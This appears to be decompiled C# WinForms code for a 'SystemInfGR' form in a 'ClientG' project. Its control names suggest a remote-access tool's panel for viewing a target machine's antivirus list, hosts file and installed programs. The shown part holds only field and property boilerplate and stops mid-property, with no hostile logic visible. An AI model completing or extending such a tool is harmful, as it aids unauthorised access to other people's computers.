using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using System.Xml;
using ClientG.My;
using ClientG.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class SystemInfGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("EtherealTabControl1")]
	private EtherealTabControl _EtherealTabControl1;

	[AccessedThroughProperty("TabPage1")]
	private TabPage _TabPage1;

	[AccessedThroughProperty("TabPage2")]
	private TabPage _TabPage2;

	[AccessedThroughProperty("TabPage3")]
	private TabPage _TabPage3;

	[AccessedThroughProperty("TabPage4")]
	private TabPage _TabPage4;

	[AccessedThroughProperty("TabPage5")]
	private TabPage _TabPage5;

	[AccessedThroughProperty("TabPage6")]
	private TabPage _TabPage6;

	[AccessedThroughProperty("TabPage7")]
	private TabPage _TabPage7;

	[AccessedThroughProperty("TabPage8")]
	private TabPage _TabPage8;

	[AccessedThroughProperty("ImageList1")]
	private ImageList _ImageList1;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("refpcinf")]
	private Button _refpcinf;

	[AccessedThroughProperty("StatusStrip1")]
	private StatusStrip _StatusStrip1;

	[AccessedThroughProperty("ToolStripStatusLabel1")]
	private ToolStripStatusLabel _ToolStripStatusLabel1;

	[AccessedThroughProperty("clearpcinf")]
	private Button _clearpcinf;

	[AccessedThroughProperty("ImageList2")]
	private ImageList _ImageList2;

	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[AccessedThroughProperty("CWL")]
	private Button _CWL;

	[AccessedThroughProperty("RWL")]
	private Button _RWL;

	[AccessedThroughProperty("StatusStrip2")]
	private StatusStrip _StatusStrip2;

	[AccessedThroughProperty("ToolStripStatusLabel2")]
	private ToolStripStatusLabel _ToolStripStatusLabel2;

	[AccessedThroughProperty("WIL")]
	private ListView _WIL;

	[AccessedThroughProperty("ColumnHeader3")]
	private ColumnHeader _ColumnHeader3;

	[AccessedThroughProperty("ColumnHeader4")]
	private ColumnHeader _ColumnHeader4;

	[AccessedThroughProperty("ColumnHeader5")]
	private ColumnHeader _ColumnHeader5;

	[AccessedThroughProperty("ImageList3")]
	private ImageList _ImageList3;

	[AccessedThroughProperty("StatusStrip3")]
	private StatusStrip _StatusStrip3;

	[AccessedThroughProperty("ToolStripStatusLabel3")]
	private ToolStripStatusLabel _ToolStripStatusLabel3;

	[AccessedThroughProperty("ListView2")]
	private ListView _ListView2;

	[AccessedThroughProperty("ColumnHeader2")]
	private ColumnHeader _ColumnHeader2;

	[AccessedThroughProperty("ColumnHeader6")]
	private ColumnHeader _ColumnHeader6;

	[AccessedThroughProperty("ColumnHeader7")]
	private ColumnHeader _ColumnHeader7;

	[AccessedThroughProperty("ColumnHeader8")]
	private ColumnHeader _ColumnHeader8;

	[AccessedThroughProperty("ColumnHeader9")]
	private ColumnHeader _ColumnHeader9;

	[AccessedThroughProperty("ImageList4")]
	private ImageList _ImageList4;

	[AccessedThroughProperty("ContextMenuStrip1")]
	private ContextMenuStrip _ContextMenuStrip1;

	[AccessedThroughProperty("RefreshToolStripMenuItem")]
	private ToolStripMenuItem _RefreshToolStripMenuItem;

	[AccessedThroughProperty("UninstallToolStripMenuItem")]
	private ToolStripMenuItem _UninstallToolStripMenuItem;

	[AccessedThroughProperty("AVLIST")]
	private ListView _AVLIST;

	[AccessedThroughProperty("ColumnHeader10")]
	private ColumnHeader _ColumnHeader10;

	[AccessedThroughProperty("ColumnHeader11")]
	private ColumnHeader _ColumnHeader11;

	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[AccessedThroughProperty("CAVLIST")]
	private Button _CAVLIST;

	[AccessedThroughProperty("AVRE")]
	private Button _AVRE;

	[AccessedThroughProperty("StatusStrip4")]
	private StatusStrip _StatusStrip4;

	[AccessedThroughProperty("ToolStripStatusLabel4")]
	private ToolStripStatusLabel _ToolStripStatusLabel4;

	[AccessedThroughProperty("ImageList5")]
	private ImageList _ImageList5;

	[AccessedThroughProperty("Textc")]
	private TextBox _Textc;

	[AccessedThroughProperty("ContextMenuStrip2")]
	private ContextMenuStrip _ContextMenuStrip2;

	[AccessedThroughProperty("ToolStripMenuItem1")]
	private ToolStripMenuItem _ToolStripMenuItem1;

	[AccessedThroughProperty("ToolStripMenuItem2")]
	private ToolStripMenuItem _ToolStripMenuItem2;

	[AccessedThroughProperty("ToolStripMenuItem3")]
	private ToolStripMenuItem _ToolStripMenuItem3;

	[AccessedThroughProperty("StatusStrip5")]
	private StatusStrip _StatusStrip5;

	[AccessedThroughProperty("ToolStripStatusLabel5")]
	private ToolStripStatusLabel _ToolStripStatusLabel5;

	[AccessedThroughProperty("HostsText")]
	private TextBox _HostsText;

	[AccessedThroughProperty("ContextMenuStrip3")]
	private ContextMenuStrip _ContextMenuStrip3;

	[AccessedThroughProperty("ToolStripMenuItem4")]
	private ToolStripMenuItem _ToolStripMenuItem4;

	[AccessedThroughProperty("ToolStripMenuItem5")]
	private ToolStripMenuItem _ToolStripMenuItem5;

	[AccessedThroughProperty("ToolStripMenuItem6")]
	private ToolStripMenuItem _ToolStripMenuItem6;

	[AccessedThroughProperty("StatusStrip6")]
	private StatusStrip _StatusStrip6;

	[AccessedThroughProperty("ToolStripStatusLabel6")]
	private ToolStripStatusLabel _ToolStripStatusLabel6;

	[AccessedThroughProperty("Panel5")]
	private Panel _Panel5;

	[AccessedThroughProperty("ListView3")]
	private ListView _ListView3;

	[AccessedThroughProperty("ColumnHeader12")]
	private ColumnHeader _ColumnHeader12;

	[AccessedThroughProperty("ColumnHeader13")]
	private ColumnHeader _ColumnHeader13;

	[AccessedThroughProperty("Panel4")]
	private Panel _Panel4;

	[AccessedThroughProperty("RFM")]
	private Button _RFM;

	[AccessedThroughProperty("PM")]
	private PictureBox _PM;

	[AccessedThroughProperty("TabControl1")]
	private TabControl _TabControl1;

	[AccessedThroughProperty("TabPage9")]
	private TabPage _TabPage9;

	[AccessedThroughProperty("ImageList6")]
	private ImageList _ImageList6;

	[AccessedThroughProperty("StatusStrip7")]
	private StatusStrip _StatusStrip7;

	[AccessedThroughProperty("ToolStripStatusLabel7")]
	private ToolStripStatusLabel _ToolStripStatusLabel7;

	[AccessedThroughProperty("TabPage10")]
	private TabPage _TabPage10;

	[AccessedThroughProperty("ColumnHeader18")]
	private ColumnHeader _ColumnHeader18;

	[AccessedThroughProperty("ContextMenuStrip4")]
	private ContextMenuStrip _ContextMenuStrip4;

	[AccessedThroughProperty("RefreshToolStripMenuItem1")]
	private ToolStripMenuItem _RefreshToolStripMenuItem1;

	[AccessedThroughProperty("RemoveToolStripMenuItem")]
	private ToolStripMenuItem _RemoveToolStripMenuItem;

	[AccessedThroughProperty("ContextMenuStrip5")]
	private ContextMenuStrip _ContextMenuStrip5;

	[AccessedThroughProperty("ToolStripMenuItem7")]
	private ToolStripMenuItem _ToolStripMenuItem7;

	[AccessedThroughProperty("ToolStripMenuItem8")]
	private ToolStripMenuItem _ToolStripMenuItem8;

	[AccessedThroughProperty("StatusStrip8")]
	private StatusStrip _StatusStrip8;

	[AccessedThroughProperty("ToolStripStatusLabel8")]
	private ToolStripStatusLabel _ToolStripStatusLabel8;

	[AccessedThroughProperty("ListView5")]
	private ListView _ListView5;

	[AccessedThroughProperty("ListView4")]
	private ListView _ListView4;

	[AccessedThroughProperty("ColumnHeader14")]
	private ColumnHeader _ColumnHeader14;

	[AccessedThroughProperty("ColumnHeader15")]
	private ColumnHeader _ColumnHeader15;

	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[AccessedThroughProperty("ColumnHeader1")]
	private ColumnHeader _ColumnHeader1;

	private ColumnHeader m_SortingColumn;

	public int Valuelah;

	public int sock;

	public XmlDocument Document;

	internal virtual EtherealTabControl EtherealTabControl1
	{
		[DebuggerNonUserCode]
		get
		{
			return _EtherealTabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_EtherealTabControl1 = value;
		}
	}

	internal virtual TabPage TabPage1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage1 = value;
		}
	}

	internal virtual TabPage TabPage2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage2 = value;
		}
	}

	internal virtual TabPage TabPage3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage3 = value;
		}
	}

	internal virtual TabPage TabPage4
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage4 = value;
		}
	}

	internal virtual TabPage TabPage5
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage5 = value;
		}
	}

	internal virtual TabPage TabPage6
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage6 = value;
		}
	}

	internal virtual TabPage TabPage7
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage7 = value;
		}
	}

	internal virtual TabPage TabPage8
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage8 = value;
		}
	}

	internal virtual ImageList ImageList1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList1 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual Button refpcinf
	{
		[DebuggerNonUserCode]
		get
		{
			return _refpcinf;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = refpcinf_Click;
			if (_refpcinf != null)
			{
				((Control)_refpcinf).remove_Click(eventHandler);
			}
			_refpcinf = value;
			if (_refpcinf != null)
			{
				((Control)_refpcinf).add_Click(eventHandler);
			}
		}
	}

	internal virtual StatusStrip StatusStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip1 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel1 = value;
		}
	}

	internal virtual Button clearpcinf
	{
		[DebuggerNonUserCode]
		get
		{
			return _clearpcinf;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = clearpcinf_Click;
			if (_clearpcinf != null)
			{
				((Control)_clearpcinf).remove_Click(eventHandler);
			}
			_clearpcinf = value;
			if (_clearpcinf != null)
			{
				((Control)_clearpcinf).add_Click(eventHandler);
			}
		}
	}

	internal virtual ImageList ImageList2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList2 = value;
		}
	}

	internal virtual Panel Panel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel2 = value;
		}
	}

	internal virtual Button CWL
	{
		[DebuggerNonUserCode]
		get
		{
			return _CWL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CWL_Click;
			if (_CWL != null)
			{
				((Control)_CWL).remove_Click(eventHandler);
			}
			_CWL = value;
			if (_CWL != null)
			{
				((Control)_CWL).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button RWL
	{
		[DebuggerNonUserCode]
		get
		{
			return _RWL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_RWL != null)
			{
				((Control)_RWL).remove_Click(eventHandler);
			}
			_RWL = value;
			if (_RWL != null)
			{
				((Control)_RWL).add_Click(eventHandler);
			}
		}
	}

	internal virtual StatusStrip StatusStrip2
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip2 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel2 = value;
		}
	}

	internal virtual ListView WIL
	{
		[DebuggerNonUserCode]
		get
		{
			return _WIL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WIL = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader3 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader4 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader5 = value;
		}
	}

	internal virtual ImageList ImageList3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList3 = value;
		}
	}

	internal virtual StatusStrip StatusStrip3
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip3 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel3 = value;
		}
	}

	internal virtual ListView ListView2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListView2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			ColumnClickEventHandler val = new ColumnClickEventHandler(ListView2_ColumnClick);
			if (_ListView2 != null)
			{
				_ListView2.remove_ColumnClick(val);
			}
			_ListView2 = value;
			if (_ListView2 != null)
			{
				_ListView2.add_ColumnClick(val);
			}
		}
	}

	internal virtual ColumnHeader ColumnHeader2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader2 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader6 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader7 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader8 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader9
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader9 = value;
		}
	}

	internal virtual ImageList ImageList4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList4 = value;
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip1 = value;
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RefreshToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshToolStripMenuItem_Click;
			if (_RefreshToolStripMenuItem != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem).remove_Click(eventHandler);
			}
			_RefreshToolStripMenuItem = value;
			if (_RefreshToolStripMenuItem != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem UninstallToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _UninstallToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = UninstallToolStripMenuItem_Click;
			if (_UninstallToolStripMenuItem != null)
			{
				((ToolStripItem)_UninstallToolStripMenuItem).remove_Click(eventHandler);
			}
			_UninstallToolStripMenuItem = value;
			if (_UninstallToolStripMenuItem != null)
			{
				((ToolStripItem)_UninstallToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ListView AVLIST
	{
		[DebuggerNonUserCode]
		get
		{
			return _AVLIST;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_AVLIST = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader10
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader10 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader11
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader11 = value;
		}
	}

	internal virtual Panel Panel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel3 = value;
		}
	}

	internal virtual Button CAVLIST
	{
		[DebuggerNonUserCode]
		get
		{
			return _CAVLIST;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CAVLIST_Click;
			if (_CAVLIST != null)
			{
				((Control)_CAVLIST).remove_Click(eventHandler);
			}
			_CAVLIST = value;
			if (_CAVLIST != null)
			{
				((Control)_CAVLIST).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button AVRE
	{
		[DebuggerNonUserCode]
		get
		{
			return _AVRE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = AVRE_Click;
			if (_AVRE != null)
			{
				((Control)_AVRE).remove_Click(eventHandler);
			}
			_AVRE = value;
			if (_AVRE != null)
			{
				((Control)_AVRE).add_Click(eventHandler);
			}
		}
	}

	internal virtual StatusStrip StatusStrip4
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip4 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel4 = value;
		}
	}

	internal virtual ImageList ImageList5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList5 = value;
		}
	}

	internal virtual TextBox Textc
	{
		[DebuggerNonUserCode]
		get
		{
			return _Textc;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Textc = value;
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip2 = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ToolStripMenuItem1_Click;
			if (_ToolStripMenuItem1 != null)
			{
				((ToolStripItem)_ToolStripMenuItem1).remove_Click(eventHandler);
			}
			_ToolStripMenuItem1 = value;
			if (_ToolStripMenuItem1 != null)
			{
				((ToolStripItem)_ToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ToolStripMenuItem2_Click;
			if (_ToolStripMenuItem2 != null)
			{
				((ToolStripItem)_ToolStripMenuItem2).remove_Click(eventHandler);
			}
			_ToolStripMenuItem2 = value;
			if (_ToolStripMenuItem2 != null)
			{
				((ToolStripItem)_ToolStripMenuItem2).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ToolStripMenuItem3_Click;
			if (_ToolStripMenuItem3 != null)
			{
				((ToolStripItem)_ToolStripMenuItem3).remove_Click(eventHandler);
			}
			_ToolStripMenuItem3 = value;
			if (_ToolStripMenuItem3 != null)
			{
				((ToolStripItem)_ToolStripMenuItem3).add_Click(eventHandler);
			}
		}
	}

	internal virtual StatusStrip StatusStrip5
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip5 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel5 = value;
		}
	}

	internal virtual TextBox HostsText
	{
		[DebuggerNonUserCode]
		get
		{
			return _HostsText;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_HostsText = value;
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip3 = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ToolStripMenuItem4_Click;
			if (_ToolStripMenuItem4 != null)
			{
				((ToolStripItem)_ToolStripMenuItem4).remove_Click(eventHandler);
			}
			_ToolStripMenuItem4 = value;
			if (_ToolStripMenuItem4 != null)
			{
				((ToolStripItem)_ToolStripMenuItem4).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ToolStripMenuItem5_Click;
			if (_ToolStripMenuItem5 != null)
			{
				((ToolStripItem)_ToolStripMenuItem5).remove_Click(eventHandler);
			}
			_ToolStripMenuItem5 = value;
			if (_ToolStripMenuItem5 != null)
			{
				((ToolStripItem)_ToolStripMenuItem5).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ToolStripMenuItem6_Click;
			if (_ToolStripMenuItem6 != null)
			{
				((ToolStripItem)_ToolStripMenuItem6).remove_Click(eventHandler);
			}
			_ToolStripMenuItem6 = value;
			if (_ToolStripMenuItem6 != null)
			{
				((ToolStripItem)_ToolStripMenuItem6).add_Click(eventHandler);
			}
		}
	}

	internal virtual StatusStrip StatusStrip6
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip6 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel6 = value;
		}
	}

	internal virtual Panel Panel5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel5 = value;
		}
	}

	internal virtual ListView ListView3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListView3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListView3 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader12
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader12 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader13
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader13 = value;
		}
	}

	internal virtual Panel Panel4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel4 = value;
		}
	}

	internal virtual Button RFM
	{
		[DebuggerNonUserCode]
		get
		{
			return _RFM;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RFM_Click;
			if (_RFM != null)
			{
				((Control)_RFM).remove_Click(eventHandler);
			}
			_RFM = value;
			if (_RFM != null)
			{
				((Control)_RFM).add_Click(eventHandler);
			}
		}
	}

	internal virtual PictureBox PM
	{
		[DebuggerNonUserCode]
		get
		{
			return _PM;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PM = value;
		}
	}

	internal virtual TabControl TabControl1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabControl1 = value;
		}
	}

	internal virtual TabPage TabPage9
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage9 = value;
		}
	}

	internal virtual ImageList ImageList6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList6;
		}
